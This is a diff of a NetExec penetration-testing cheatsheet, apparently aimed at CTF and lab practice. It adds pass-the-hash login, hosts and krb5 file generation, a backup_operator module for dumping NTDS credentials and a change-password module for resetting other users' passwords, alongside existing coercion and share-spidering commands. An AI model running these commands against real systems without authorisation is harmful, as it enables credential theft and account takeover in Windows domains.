@@ -1,10 +1,10 @@
 # NetExec Cheatsheet
 A cheatsheet for NetExec, featuring useful commands and modules for different services.<br>
 
-You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)
+You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https://seriotonctf.github.io/CrackMapExec-and-NetExec-Cheat-Sheet/)
 
 
-- **NetExec:** https://github.com/Pennyw0rth/NetExec
+- **GitHub:** https://github.com/Pennyw0rth/NetExec
 - **Wiki:** https://www.netexec.wiki
 
 ## **Table of Contents**  
@@ -26,6 +26,8 @@ You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https:/
      - [All-in-One](#all-in-one)
      - [Extracting Files](#extracting-files)
      - [Spider_plus Module](#spider_plus-module)
+     - [Generate Hosts File](#Generate-Hosts-File)
+     - [Generate krb5 File](#Generate-krb5-File)
    - [LDAP](#ldap)
      - [User Enumeration](#user-enumeration)
      - [All-in-One](#all-in-one)
@@ -59,6 +61,8 @@ You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https:/
    - [slinky](#slinky)
    - [coerce_plus](#coerce_plus)
    - [enum_av](#enum_av)
+   - [backup_operator](#backup_operator)
+   - [change-password](#change-password)
 9. [Resources](#resources)
 10. [Practice](#practice)
 
@@ -68,13 +72,21 @@ sudo apt install pipx git
 pipx ensurepath
 pipx install git+https://github.com/Pennyw0rth/NetExec
 ```
+Latest version at the time of writing this
 ```
 netexec --version
-1.3.0 - NeedForSpeed - a5ec90e4
+1.4.0 - SmoothOperator - 9668cbce - 7
+```
+Upgrading via pipx
+```
+pipx upgrade netexec
 ```
 ## **Basic Usage**  
 ```
 netexec <service> <target> -u <username> -p <password>
+```
+```
+netexec <service> <target> -u <username> -H <hash>
 ```
 Example for SMB:  
 ```
@@ -142,6 +154,14 @@ netexec smb target -u username -p password -k --get-file target_file output_file
 ```
 netexec smb target -u username -p password -M spider_plus
 netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
+```
+#### **Generate Hosts File**
+```
+netexec smb target --generate-hosts-file <out_file>
+```
+#### **Generate krb5 File**
+```
+netexec smb target -u username -p password --generate-krb5-file <out_file>
 ```
 ### **LDAP**  
 #### **User Enumeration**  
@@ -278,6 +298,16 @@ netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip
 Gathers information on all endpoint protection solutions installed on the the remote host
 ```
 netexec smb target -u username -p password -M enum_av
+```
+### **backup_operator**
+Exploit user in backup operator group to dump NTDS
+```
+netexec smb target -u username -p password -M backup_operator
+```
+### **change-password**
+Change or reset user password
+```
+netexec smb target -u username -p password -M change-password -o USER='target_user' NEWPASS='new_password'
 ```
 ## Resources
 - https://www.netexec.wiki/
